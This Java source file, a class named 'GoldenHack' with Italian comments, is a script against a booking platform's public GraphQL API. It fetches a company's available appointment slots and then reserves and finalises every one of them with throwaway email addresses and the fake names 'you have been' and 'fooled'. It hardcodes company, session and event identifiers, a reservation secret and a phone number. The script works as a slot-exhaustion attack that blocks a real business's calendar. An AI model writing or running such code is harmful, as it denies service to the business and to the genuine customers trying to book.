package Modules;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class GoldenHack {

    private static final String SESSION_ID = "c841b577-72f6-47f2-a63a-cd5dd2b6d8e0";
    private static final String SERVICE_ID = "5fca02cfcc9a3f11d57db37a";
    private static final String COMPANY_ID = "5fc9fd91e1cc0711f6b239a5";


    public static String sendPrenotation() throws JSONException, IOException {
        try {
            URL url = new URL("https://api-public.timify.io/");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();

            // Configura la connessione HTTP
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("Accept", "application/json");
            connection.setDoOutput(true);

            // Costruisci il corpo della richiesta JSON
            String jsonInputString = """
                    {
                      "operationName": "getOnlineServiceAvailability",
                      "variables": {
                        "params": {
                          "companyId": "%s",
                          "region": "EUROPE",
                          "days": [
                            "2024-03-04"
                          ],
                          "skipAllDays": false,
                          "serviceId": "%s"
                        },
                        "timezone": "Europe/Rome",
                        "sessionId": "%s"
                      },
                      "query": "query getOnlineServiceAvailability($params: OnlineServiceAvailabilityParams!, $timezone: Timezone, $sessionId: ID, $metadata: Dynamic) {\\n  getOnlineServiceAvailability(params: $params, timezone: $timezone, sessionId: $sessionId, metadata: $metadata) {\\n    dependencies {\\n      name\\n      resourceIds\\n    }\\n    resources {\\n      id\\n      abbreviation\\n      externalId\\n      name\\n      categoryId\\n      avatarUrl\\n      color\\n      orderIndex\\n    }\\n    resourceCategories {\\n      id\\n      name\\n      orderIndex\\n    }\\n    slots {\\n      day\\n      minutes\\n    }\\n    calendarEnd\\n    calendarBegin\\n    onDays\\n    offDays\\n    allocationOffDays\\n  }\\n}\\n"
                    }""".formatted(COMPANY_ID, SERVICE_ID, SESSION_ID);

            // Invia i dati della richiesta
            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonInputString.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            // Leggi la risposta
            try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream(), "utf-8"))) {
                StringBuilder response = new StringBuilder();
                String responseLine = null;
                while ((responseLine = br.readLine()) != null) {
                    response.append(responseLine.trim());
                }
                System.out.println("Response: " + response.toString());

                // Analizza la risposta JSON
                JSONObject jsonObject = new JSONObject(response.toString());
                JSONObject data = jsonObject.getJSONObject("data");
                JSONObject getOnlineServiceAvailability = data.getJSONObject("getOnlineServiceAvailability");
                JSONArray onDays = getOnlineServiceAvailability.getJSONArray("onDays");
                // Stampa i valori di onDays e invia la chiamata POST per ogni giorno
                for (int i = 0; i < onDays.length(); i++) {
                    String day = onDays.getString(i);
                    System.out.println("Day: " + day);
                    JSONArray slots = getOnlineServiceAvailability.getJSONArray("slots");
                    JSONObject slot = slots.getJSONObject(0);
                    System.out.println(slots.toString());
                    JSONArray onTime = slot.getJSONArray("minutes");
                    System.out.println("ONTIME: " + onTime);
                    // Costruisci il nuovo JSON con la data corrente
                    for(int j = 0; j < onTime.length(); j++){
                        String jsonInputStringPrenotation = """
                                {
                                  "operationName": "reserveOnlineService",
                                  "variables": {
                                    "params": {
                                      "companyId": "%s",
                                      "region": "EUROPE",
                                      "serviceId": "%s",
                                      "slot": {
                                        "day": "%s",
                                        "minute": %d
                                      }
                                    },
                                    "timezone": "Europe/Rome",
                                    "sessionId": "%s",
                                    "metadata": {}
                                  },
                                  "query": "mutation reserveOnlineService($params: OnlineServiceReservationParams!, $timezone: Timezone, $sessionId: ID, $metadata: Dynamic) { reserveOnlineService(params: $params, timezone: $timezone, sessionId: $sessionId, metadata: $metadata) { companyId eventId secret } }"
                                }
                                """.formatted(COMPANY_ID, SERVICE_ID, onDays.getString(i), onTime.getInt(j) , SESSION_ID);
                        String newJsonInputString = """
                                {
                                  "operationName": "finaliseOnlineEventReservation",
                                  "variables": {
                                    "event": {
                                      "companyId": "%s",
                                      "region": "EUROPE",
                                      "eventId": "65dcfacf812e34d9d9952fd0",
                                      "voucherCode": "",
                                      "secret": "70bdf9f6-9db9-417d-93d4-f4446d37b172",
                                      "fields": [
                                        {
                                          "id": "5fc9fd91e1cc0711f6b239b0",
                                          "type": "TEXT",
                                          "value": "you have been"
                                        },
                                        {
                                          "id": "5fc9fd91e1cc0711f6b239b1",
                                          "type": "TEXT",
                                          "value": "fooled"
                                        },
                                        {
                                          "id": "5fc9fd91e1cc0711f6b239b2",
                                          "type": "EMAIL",
                                          "value": "%s"
                                        },
                                        {
                                          "id": "5fc9fd91e1cc0711f6b239b3",
                                          "type": "PHONE",
                                          "value": "{\"number\":\"+393816196197\",\"country\":\"IT\"}"
                                        }
                                      ]
                                    },
                                    "sessionId": "%s",
                                    "metadata": {
                                      "customerTimezone": "Europe/Rome"
                                    },
                                    "externalCustomerId": null
                                  },
                                  "query": "mutation finaliseOnlineEventReservation($event: EventReservationPayload!, $sessionId: ID, $metadata: Dynamic, $externalCustomerId: ID) {\\n  finaliseOnlineEventReservation(event: $event, sessionId: $sessionId, metadata: $metadata, externalCustomerId: $externalCustomerId) {\\n    id\\n    icsText\\n    icsData {\\n      description\\n      title\\n    }\\n  }\\n}\\n"
                                }""".formatted(COMPANY_ID, TempMailGenerator.getNewMail(), SESSION_ID);

                        // Chiamata POST con il nuovo JSON
                        sendPostRequest(jsonInputStringPrenotation);
                        sendPostRequest(newJsonInputString);
                    }
                    
                }
                connection = (HttpURLConnection) url.openConnection();
                // Configura la connessione HTTP
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setRequestProperty("Accept", "application/json");
                connection.setDoOutput(true);
                // Invia i dati della richiesta
            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonInputString.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            // Leggi la risposta
            try (BufferedReader bresp = new BufferedReader(new InputStreamReader(connection.getInputStream(), "utf-8"))) {
                StringBuilder responseFinale = new StringBuilder();
                String responseFinaleLine = null;
                while ((responseFinaleLine = bresp.readLine()) != null) {
                    responseFinale.append(responseFinaleLine).append("\n");
                }
                System.out.println("Response: " + responseFinale.toString());
                
            // Chiudi la connessione
            connection.disconnect();
            return responseFinale.toString();
            }} catch (Exception e) {
                e.printStackTrace();
                return "Hack non riuscito";
            }
        }catch (Exception ex){
            ex.printStackTrace();
            return "Hack non riuscito";
        }
    }

    private static void sendPostRequest(String jsonInputString) {
    try {
        URL url = new URL("https://api-public.timify.io/");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();

        // Configura la connessione HTTP
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("Accept", "application/json");
        connection.setDoOutput(true);

        // Invia i dati della richiesta
        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = jsonInputString.getBytes("utf-8");
            os.write(input, 0, input.length);
        }

        // Leggi la risposta
        try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream(), "utf-8"))) {
            StringBuilder response = new StringBuilder();
            String responseLine = null;
            while ((responseLine = br.readLine()) != null) {
                response.append(responseLine.trim());
            }
            System.out.println("2) POST Response: " + response.toString());
        }

        // Chiudi la connessione
        connection.disconnect();

    } catch (Exception e) {
        e.printStackTrace();
    }
}

}
